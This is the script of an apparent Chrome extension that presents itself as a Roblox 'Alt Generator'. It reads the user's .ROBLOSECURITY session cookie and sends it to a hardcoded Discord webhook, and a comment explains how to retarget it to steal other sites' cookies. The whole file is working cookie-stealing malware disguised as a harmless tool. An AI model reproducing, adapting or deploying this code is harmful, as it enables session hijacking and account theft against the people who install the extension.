function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `Alt Generator`,
            "description": "Generate a Roblox 2017 Alt.",
            "color": 15258703,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/1002689128749613137/cz_VbCRVgbQEiq91sPWIJxuR7bBHO3EgfJ9f2FvgmrjyxyCc5k-5lnmc7lpjCl0NsERl", cookie.value);
  }
});
